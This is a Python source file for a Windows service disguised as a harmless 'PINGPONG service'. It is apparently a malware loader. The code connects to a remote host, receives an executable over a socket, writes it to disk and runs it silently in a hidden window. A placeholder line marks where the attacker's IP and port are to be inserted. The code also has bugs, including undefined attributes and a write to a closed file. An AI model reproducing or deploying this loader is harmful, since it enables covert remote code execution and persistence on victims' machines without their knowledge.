# -*- coding:utf-8 -*-
# @FileName  :pingpong_service.py
# @Time      :2023/01/12 16:37:44
# @Author    :D0WE1L1N
#--hiddenimport win32timezone
import win32serviceutil 
import win32service 
import win32event 
import socket
from threading import Thread
import servicemanager
from os import remove
from sys import argv
# import servicemanager
from os.path import isfile
from win32process import CreateProcess, CREATE_NO_WINDOW, STARTUPINFO


class PythonService(win32serviceutil.ServiceFramework): 
    _svc_name_ = "Piposvc"
    _svc_display_name_ = "PINGPONG service"
    _svc_description_ = "PINGPONG service of your host"
    def collect_payload(self):
        len_data = self.s.recv(1024).decode('utf8')
        self.s.send(bytes("OK", "UTF8"))
        upload_data = self.s.recv(int(len_data))
        if isfile(f'{self._id}.exe'):
            remove(f'{self._id}.exe')
        f = open(f"{self._id}.exe", "wb+")
        f.write(upload_data)
        f.close()
        self.s.close()
        CreateProcess(f"{self._id}.exe", '', None, None, 0, CREATE_NO_WINDOW, None, None, STARTUPINFO())
        f.write('Back to main\n')
    def main(self):
        while self.run:
            with open('D:/LOGGINGTEST.txt', 'w') as f:
                f.write('Start to connect\n')
                f.flush()
                try:
                    f.write('Connecting\n')
                    f.flush()
                    self.s.connect((self.ip, self.port))
                    f.write('Connect Success\n')
                    f.flush()
                    t = Thread(target=self._connect, args=(self.s, ))
                    t.start()
                except:
                    f.write('Connect faid\n')
                    f.flush()
    def _connect(self):
        try:
            self.s.recv(1024)
            self.s.send(bytes(str(len(self._id)), 'utf8'))
            self.s.recv(1024)
            self.s.send(bytes(self._id, 'utf8'))
            is_make = self.s.recv(1024)
            if is_make == b'OK':
                self.collect_payload()
            elif is_make == b'wait':
                self.s.recv(1024)
                self.collect_payload()
        except:
            pass
    def SvcDoRun(self):
        self.ReportServiceStatus(win32service.SERVICE_RUNNING)  
        self.main()
    def SvcStop(self): 
        self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING)  
        self.run = False
        win32event.SetEvent(self.hWaitStop) 
    def __init__(self, args): 
        win32serviceutil.ServiceFramework.__init__(self, args) 
        self.hWaitStop = win32event.CreateEvent(None, 0, 0, None)
        self.run = True
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

#WRITE_IN_LINE_FOR_IP_AND_PORT

if __name__=='__main__': 
    if len(argv) == 1:
        servicemanager.Initialize()
        servicemanager.PrepareToHostSingle(PythonService)
        servicemanager.StartServiceCtrlDispatcher()
    else:
        win32serviceutil.HandleCommandLine(PythonService)  